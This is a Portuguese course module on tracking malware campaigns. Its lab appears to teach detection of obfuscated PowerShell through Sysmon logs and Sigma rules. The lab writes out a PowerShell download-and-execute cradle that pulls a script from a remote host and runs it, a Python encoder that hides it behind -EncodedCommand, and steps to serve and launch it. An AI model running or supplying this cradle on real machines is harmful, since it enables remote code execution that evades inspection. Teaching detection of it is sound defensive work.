# 03. Rastreamento de Campanhas de Malware
- 03.1. Técnicas de Detecção de Malware
- 03.2. Análise de Campanhas de Malware
- 03.3. Coleta e Análise de Artefatos Maliciosos
- 03.4. Extração de IOCs e Criação de Regras
- 03.5. Estudo de Caso: Campanha de Phishing com Malware

## Técnicas de Detecção de Malware
Tipos de Malware Abordados:
- Fileless malware
- Ransomware
- Loaders

## Atividade Prática: Detecção de PowerShell Obfuscado com Sysmon 
Cenário: Um atacante executa um script PowerShell obfuscado via -EncodedCommand.
O script realiza conexão com C2 e baixa um payload. 

Passos:
1. Executar script malicioso em ambiente controlado.
2. Coletar logs de eventos ID 1 (Process Creation).
3. Filtrar por processos com argumentos suspeitos.
4. Criar regra Sigma para detectar padrões

Prática
Kali Linux
```
https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo03/scripts/encode-command.py
```

Editando o script de acordo com o nosso comando:
```
nano encode-command.py
```

Comando a ser incluido
```
powershell (New-Object System.Net.WebClient).DownloadString('http://update-sync.org/enc.ps1')|IEX
```

Resultado final do script
```
$ cat encode-command.py                                                                           
import base64

def gerar_comando_encodado(comando_ps):
    # Codifica o comando em UTF-16LE, exigido pelo PowerShell
    comando_bytes = comando_ps.encode('utf-16le')
    comando_base64 = base64.b64encode(comando_bytes).decode('utf-8')
    
    # Comando final completo
    comando_final = f'powershell -EncodedCommand {comando_base64}'
    return comando_final

# Insira seu comando PowerShell aqui
#comando = 'Get-Process | Where-Object {$_.CPU -gt 100}'
comando = "powershell (New-Object System.Net.WebClient).DownloadString('http://update-sync.org/enc.ps1')|IEX"

# Exibe o comando encodado completo
print("Comando PowerShell Encodado:")
print(gerar_comando_encodado(comando))
```

Executando o script
```
python encode-command.py
```

Resultado do script
```
$ python encode-command.py                                                                        
Comando PowerShell Encodado:
powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAG8AcgBnAC8AZQBuAGMALgBwAHMAMQAnACkAfABJAEUAWAA=
```

Payload a ser executado: whoami
```
echo whoami > enc.ps1
```

Iniciando Webserver em Python na porta 80
```
python -m http.server 80
```

Executando o comando encodade no Windows
```
powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAG8AcgBnAC8AZQBuAGMALgBwAHMAMQAnACkAfABJAEUAWAA=
```
